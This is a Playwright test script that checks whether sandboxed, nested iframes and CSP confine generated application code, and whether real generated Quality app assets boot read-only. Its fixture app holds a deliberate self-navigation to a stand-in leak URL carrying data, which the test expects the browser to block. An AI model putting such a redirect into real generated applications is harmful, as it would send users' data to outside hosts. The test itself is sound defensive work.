// Verify browser-enforced application isolation using local fixture code only.
import fs from "node:fs/promises";
import ts from "typescript";
import { chromium } from "@playwright/test";
const source = await fs.readFile(
  new URL(
    "../packages/views/semantic/application-document.ts",
    import.meta.url,
  ),
  "utf8",
);
const compiled = ts.transpileModule(source, {
  compilerOptions: {
    module: ts.ModuleKind.CommonJS,
    target: ts.ScriptTarget.ES2022,
  },
}).outputText;
const browser = await chromium.launch({ headless: true });
try {
  const page = await browser.newPage();
  const requests = [];
  const violations = [];
  await page.route("**/*", async (route) => {
    requests.push(route.request().url());
    await route.fulfill({ status: 200, body: "blocked test navigation" });
  });
  page.on("console", (message) => {
    if (message.text().includes("Content Security Policy"))
      violations.push(message.text());
  });
  const app = `<html><body><p>Waiting</p><script>window.addEventListener('enact-ready',async()=>{const result=await window.enact.call('context');document.body.innerHTML='<h1>Scoped application</h1><p id="result">'+result.name+'</p>';window.ready=true;setTimeout(()=>{location.href='https://application-isolation.invalid/leak?data=fixture'},100);});</script></body></html>`;
  const build = {
    id: "test",
    manifest: { entry: "index.html" },
    files: {
      "index.html": {
        content: Buffer.from(app).toString("base64"),
        mediaType: "text/html",
      },
    },
  };
  await page.setContent(
    '<html><body><iframe sandbox="allow-scripts" title="Host" style="width:900px;height:650px"></iframe></body></html>',
  );
  await page.evaluate(
    ({ compiled, build }) => {
      const module = { exports: {} };
      new Function("exports", "module", compiled)(module.exports, module);
      const outer = document.querySelector("iframe");
      window.addEventListener("message", (event) => {
        if (
          event.source !== outer.contentWindow ||
          event.data?.type !== "enact.application.ready"
        )
          return;
        const channel = new MessageChannel();
        channel.port1.onmessage = (event) =>
          channel.port1.postMessage({
            id: event.data.id,
            ok: true,
            value: { name: "Quality reference" },
          });
        channel.port1.start();
        outer.contentWindow.postMessage(
          { type: "enact.application.init" },
          "*",
          [channel.port2],
        );
      });
      outer.srcdoc = module.exports.buildApplicationEnvelope(build);
    },
    { compiled, build },
  );
  await page
    .frameLocator("iframe")
    .frameLocator("iframe")
    .getByText("Quality reference")
    .waitFor();
  await page.waitForTimeout(250);
  if (requests.length)
    throw new Error(
      "Sandbox allowed an external request: " + requests.join(", "),
    );
  if (!violations.length)
    throw new Error("Expected the browser to report a blocked navigation");
  console.log(
    "PASS: application SDK round trip, opaque nested frames, and parent CSP blocked generated-code self-navigation.",
  );
  const packagePath = process.argv[2];
  if (packagePath) {
    const saved = JSON.parse(await fs.readFile(packagePath, "utf8"));
    const build = {
      ...saved,
      files: Object.fromEntries(
        Object.entries(saved.files).map(([name, file]) => [
          name,
          { content: file.content, mediaType: file.media_type },
        ]),
      ),
    };
    const preview = await browser.newPage();
    const errors = [];
    preview.on("pageerror", (error) => errors.push(error.message));
    await preview.setContent(
      '<iframe sandbox="allow-scripts" style="width:1100px;height:800px"></iframe>',
    );
    await preview.evaluate(
      ({ compiled, build }) => {
        const module = { exports: {} };
        new Function("exports", "module", compiled)(module.exports, module);
        const frame = document.querySelector("iframe");
        const run = {
          id: "browser-fixture",
          steps: [],
          approvals: [],
          receipts: [],
        };
        window.referenceCalls = [];
        window.addEventListener("message", (event) => {
          if (
            event.source !== frame.contentWindow ||
            event.data?.type !== "enact.application.ready"
          )
            return;
          const channel = new MessageChannel();
          channel.port1.onmessage = (event) => {
            const { id, operation, input } = event.data;
            window.referenceCalls.push(operation);
            let value;
            if (operation === "context")
              value = {
                manifest: build.manifest,
                application: {
                  ontology_release_id: build.manifest.ontology_release_id,
                },
                user_id: "browser-user",
              };
            else if (operation === "run.list") value = [];
            else if (operation === "run.get" || operation === "run.create")
              value = run;
            else if (operation === "query")
              value = {
                step_id: "browser-step",
                status: "succeeded",
                output:
                  input.binding_id === "bind.qt.context"
                    ? {
                        actor: {
                          id: "browser-user",
                          roles: ["QualityEngineer"],
                          plants: ["AT01"],
                        },
                      }
                    : { items: [] },
              };
            else {
              channel.port1.postMessage({
                id,
                ok: false,
                error: "No business writes in browser fixture",
              });
              return;
            }
            channel.port1.postMessage({ id, ok: true, value });
          };
          channel.port1.start();
          frame.contentWindow.postMessage(
            { type: "enact.application.init" },
            "*",
            [channel.port2],
          );
        });
        frame.srcdoc = module.exports.buildApplicationEnvelope(build);
      },
      { compiled, build },
    );
    await preview
      .frameLocator("iframe")
      .frameLocator("iframe")
      .getByRole("heading", { name: "质量事件工作区" })
      .waitFor();
    await preview.waitForFunction(
      () => window.referenceCalls.filter((op) => op === "query").length >= 2,
    );
    if (errors.length)
      throw new Error("Generated application errors: " + errors.join(", "));
    console.log(
      "PASS: actual generated Quality application assets boot in the production envelope and complete SDK initialization (read-only UI fixture).",
    );
  }
} finally {
  await browser.close();
}
